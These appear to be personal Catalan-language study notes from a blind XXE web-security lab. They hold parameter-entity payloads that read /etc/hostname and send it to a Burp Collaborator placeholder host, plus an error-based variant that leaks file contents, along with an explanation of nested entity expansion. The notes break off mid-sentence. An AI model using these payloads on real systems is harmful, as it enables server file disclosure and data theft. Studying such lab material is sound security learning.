
---

Veiem aixo tambe sempre
![[Pasted image 20250806193303.png]]

Proceim a crear una Entitat de Parametres (Externes - són externes quan s'utlitlza system)
![[Pasted image 20250806193559.png]]

Fem aquesta peticio, dient que ens fagi una peticio al nostre domini de BurpCollaborator, i veiem que ens retorna un error, i aixo ja es algo bo, ja que amb les altres entitatrs no fa res

ara farem 3 entitats, per poder veure un arxiu que volguem

```
	<!ENTITY % file SYSTEM "file:///etc/hostname">
	<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM'https://IP_BURPCOLLABORATOR/?content=%file;'>">
	%eval;
	%exfil;
```

si aixo li passem a la victima a l'exploit server, veuerem el hostname.

Si provessim de fer el etc/passwd, veiem que ens dona un error per qeu es un arxiu molt gran, hem de fer aixo:

```
	<!ENTITY % file SYSTEM "file:///etc/hostname">
	<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///noexisto/%file;'>">
	%eval;
	%exfil;
```

en aquest cas doncs veuerm tot el contingut en el missatge de error ja que realment amb %file ja ho carreguem tot
![[Pasted image 20250806194819.png]]
<h1>dubtes</h1>
# Per què NO podem fer directament:

<ENTITY % file SYSTEM "file:///etc/hostname">
<ENTITY % exfil SYSTEM "https://IP_BURPCOLLABORATOR/?content=%file;">
%exfil;

Per què això no funciona?

    Les entitats paràmetre % no s’expandeixen dins la definició d’una altra entitat.

    Això vol dir que dins la línia que defineix %exfil, si posem %file; directament, no es substituirà pel contingut de /etc/hostname.

    El parser XML només substitueix entitats paràmetre en línies diferents, no dins de la mateixa definició.

### Per què fem servir `%eval` com a entitat paràmetre?

- No podem posar directament una entitat paràmetre dins la definició d’una altra perquè el parser no substitueix `%file;` dins la definició de `%exfil`.
    
- Però podem definir una entitat que **conté el codi per definir una altra entitat**, i després expandir-la.
    
- `%eval` conté el text: